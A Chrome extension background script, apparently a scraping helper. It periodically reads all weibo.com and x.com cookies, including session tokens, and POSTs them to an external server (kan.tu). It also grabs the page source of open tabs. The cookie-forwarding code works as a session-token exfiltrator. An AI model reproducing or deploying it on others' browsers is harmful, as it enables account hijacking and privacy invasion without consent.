// background.js

const TARGET_DOMAINS = [
    'weibo.com',
    'x.com'
];

const API_ENDPOINT = 'https://kan.tu/api/manage/cookie';

// 创建基于域名的防抖函数
function debounceByDomain(func, wait) {
    const timeoutMap = new Map();

    return function (msg) {
        const domain = msg.domain;
        if (timeoutMap.has(domain)) {
            clearTimeout(timeoutMap.get(domain));
        }

        timeoutMap.set(domain, setTimeout(() => {
            func.call(this, msg);
            timeoutMap.delete(domain);
        }, wait));
    };
}

// 监听来自 content script 的消息
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.topic === 'sendCookies') {
        debouncedSendCookies(msg);
        sendResponse(true);
        return true;
    }

    if (msg.topic === 'getPageSource') {
        getSourceByTabId(msg.tabId).then(sendResponse).catch(() => sendResponse({ error: '获取失败' }));
        return true;
    }

    if (msg.topic === 'getAllTabs') {
        getAllTabs().then(sendResponse).catch(() => sendResponse([]));
        return true;
    }

    if (msg.topic === 'openLocalPage') {
        openLocalPage(msg).then(sendResponse).catch(e => sendResponse({ success: false, error: e.message }));
        return true;
    }

    if (msg.topic === 'openAndGrab') {
        openAndGrab(msg, sender).then(sendResponse).catch(e => sendResponse({ success: false, error: e.message }));
        return true;
    }
});

// 统计可用标签页数量并更新角标
function detectPageType(url) {
    try {
        const { hostname, pathname } = new URL(url);
        if (hostname.includes('douyin.com')) {
            if (pathname.startsWith('/user/') || pathname.startsWith('/video/')) return true;
        }
        if (hostname.includes('xiaohongshu.com')) {
            if (pathname.startsWith('/user/profile/') || pathname.startsWith('/explore/') || pathname.startsWith('/discovery/')) return true;
        }
    } catch {}
    return false;
}

async function updateBadge() {
    const tabs = await chrome.tabs.query({});
    const count = tabs.filter(tab => tab.url && detectPageType(tab.url)).length;
    chrome.action.setBadgeText({ text: count > 0 ? String(count) : '' });
    chrome.action.setBadgeBackgroundColor({ color: '#7C4DFF' });
}

chrome.tabs.onCreated.addListener(updateBadge);
chrome.tabs.onRemoved.addListener(updateBadge);
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.url) updateBadge();
    // 在本地页面注入 __wormhole 标记
    if (changeInfo.status === 'complete' && tab.url &&
        (tab.url.includes('kan.tu') || tab.url.includes('localhost') || tab.url.includes('127.0.0.1'))) {
        injectWormholeMark(tabId);
    }
});

// 启动时更新一次
updateBadge();

// 获取所有标签页列表
async function getAllTabs() {
    const tabs = await chrome.tabs.query({});
    return tabs.map(tab => ({
        id: tab.id,
        title: tab.title,
        url: tab.url,
        favIconUrl: tab.favIconUrl,
        active: tab.active,
        lastAccessed: tab.lastAccessed
    }));
}

// 获取指定标签页的源代码
async function getSourceByTabId(tabId) {
    try {
        const results = await chrome.scripting.executeScript({
            target: { tabId },
            func: () => document.documentElement.outerHTML
        });
        if (!results?.[0]) return { error: '无法获取页面内容' };
        const tab = await chrome.tabs.get(tabId);
        return { source: results[0].result, url: tab.url, title: tab.title };
    } catch (error) {
        return { error: error.message };
    }
}

// 当扩展安装或更新时设置定时任务
chrome.runtime.onInstalled.addListener(() => {
    chrome.alarms.create('checkTokens', {
        periodInMinutes: 1
    });
});

// 监听定时任务
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'checkTokens') {
        checkAndSendTokens();
    }
});

// 监听页面导航完成
chrome.webNavigation.onCompleted.addListener((details) => {
    const domain = new URL(details.url).hostname;
    if (TARGET_DOMAINS.some(target => domain.includes(target))) {
        sendCookiesForDomain(domain);
    }
}, {
    url: TARGET_DOMAINS.map(domain => ({ hostContains: domain }))
});

async function getAllCookies(msg) {
    const cookies = await chrome.cookies.getAll({ domain: msg.domain.replace('www.', '') });
    const cookieStrings = [];

    if (Array.isArray(cookies)) {
        for (const cookie of cookies) {
            cookieStrings.push(`${cookie.name}=${cookie.value}`);
        }
    }

    if (msg.cookie) {
        const documentCookies = msg.cookie.split('; ');
        for (const cookie of documentCookies) {
            const [name, value] = cookie.split('=');
            if (!cookies.find(singleCookie => singleCookie.name === name)) {
                cookieStrings.unshift(cookie);
            }
        }
    }
    return cookieStrings.join('; ');
}

async function sendCookies(msg) {
    const cookie = await getAllCookies(msg);
    const url = new URL(API_ENDPOINT);
    url.searchParams.set('domain', msg.domain);

    const formData = new FormData();
    formData.append('content', cookie);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData,
        });
        if (!response.ok) {
            console.error(`Failed to send cookies for ${msg.domain}: ${response.status}`);
        }
    } catch (error) {
        console.error(`Error sending cookies for ${msg.domain}:`, error);
    }
}

// 创建基于域名的防抖版本（每个域名独立防抖，等待10秒）
const debouncedSendCookies = debounceByDomain(sendCookies, 10000);

async function sendCookiesForDomain(domain) {
    const msg = {
        topic: 'sendCookies',
        domain: domain,
        cookie: ''
    };
    debouncedSendCookies(msg);
}

async function checkAndSendTokens() {
    for (const domain of TARGET_DOMAINS) {
        sendCookiesForDomain(domain);
    }
}

// 向本地页面注入标记和事件（在页面主世界执行）
async function openLocalPage({ type, url, source }) {
    const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!activeTab || !activeTab.url || (!activeTab.url.includes('kan.tu') && !activeTab.url.includes('localhost') && !activeTab.url.includes('127.0.0.1'))) {
        return { success: false, error: '请先切换到 kan.tu 或 localhost 页面' };
    }

    try {
        const action = type === 'COOKIESENDER_OPEN_LIST' ? 'openList' : 'openDetail';
        await chrome.scripting.executeScript({
            target: { tabId: activeTab.id },
            world: 'MAIN',
            func: (actionName, targetUrl, sourceCode) => {
                window.dispatchEvent(new CustomEvent('cookieSender', {
                    detail: { action: actionName, url: targetUrl, source: sourceCode }
                }));
            },
            args: [action, url, source]
        });
        return { success: true };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// 页面加载时注入 __wormhole 标记
async function injectWormholeMark(tabId) {
    try {
        await chrome.scripting.executeScript({
            target: { tabId },
            world: 'MAIN',
            func: () => { window.__wormhole = true; }
        });
    } catch {}
}

// 在本地页面注入 cookieSender 事件
async function dispatchCookieSenderEvent(tabId, detail) {
    await chrome.scripting.executeScript({
        target: { tabId },
        world: 'MAIN',
        func: (d) => {
            window.dispatchEvent(new CustomEvent('cookieSender', { detail: d }));
        },
        args: [detail]
    });
}

// 推送状态到前端页面
async function pushStatus(tabId, status) {
    try {
        await chrome.scripting.executeScript({
            target: { tabId },
            world: 'MAIN',
            func: (s) => { window.dispatchEvent(new CustomEvent('wormholeStatus', { detail: s })); },
            args: [status]
        });
    } catch {}
}

// 打开新标签页，加载完成后自动抓取源码并发回前端
async function openAndGrab({ type, url }, sender) {
    const frontendTabId = sender?.tab?.id;
    if (!frontendTabId) {
        return { success: false, error: '无法确定前端标签页' };
    }

    const tab = await chrome.tabs.create({ url, active: true });
    pushStatus(frontendTabId, '等待页面加载...');

    // 抓取完成后切回原标签
    function switchBack() {
        chrome.tabs.update(frontendTabId, { active: true });
    }

    let cleaned = false;
    function cleanup() {
        if (cleaned) return;
        cleaned = true;
        chrome.tabs.onUpdated.removeListener(listener);
    }

    function listener(tabId, changeInfo) {
        if (tabId !== tab.id || changeInfo.status !== 'complete') return;
        cleanup();
        pushStatus(frontendTabId, '抓取源码中...');

        setTimeout(async () => {
            try {
                const results = await chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    func: () => document.documentElement.outerHTML
                });
                const source = results?.[0]?.result;
                if (!source) return;

                const action = type === 'COOKIESENDER_OPEN_LIST' ? 'openList' : 'openDetail';
                const detail = { action, url, source };
                pushStatus(frontendTabId, '发送到前端...');

                try {
                    await chrome.tabs.sendMessage(frontendTabId, {
                        topic: 'cookieSenderEvent',
                        detail
                    });
                } catch {
                    await dispatchCookieSenderEvent(frontendTabId, detail);
                }
                // 抓取完成，关闭临时标签页并切回
                chrome.tabs.remove(tab.id);
                switchBack();
                pushStatus(frontendTabId, '');
            } catch (e) {
                console.error('[虫洞] 自动抓取失败:', e);
            }
        }, 1500);
    }

    chrome.tabs.onUpdated.addListener(listener);

    // 30秒超时清理
    setTimeout(cleanup, 30000);

    return { success: true };
}